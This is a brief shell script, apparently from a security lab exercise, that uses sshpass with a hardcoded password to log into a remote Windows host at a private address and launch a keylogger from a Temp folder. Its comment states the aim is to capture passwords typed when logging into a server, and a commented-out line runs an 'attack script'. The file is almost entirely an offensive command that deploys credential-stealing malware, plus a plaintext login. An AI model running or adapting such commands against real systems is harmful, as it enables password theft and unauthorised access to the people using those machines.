#!/bin/sh

# Description: This file/script would run a keylogger on the remote host to capture passwords key-ed in when logging into cap server
# Tag: Keylogger Running in Background
# sshpass -p 'Student12345@' ssh student@172.16.2.223 -o ConnectTimeout=5 "cd \"C:\Windows\Temp\SmartMetertest\" && Attackscript.exe 12"
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "cd \"C:\Windows\Temp\SmartMetertest\" && Keylogger.exe"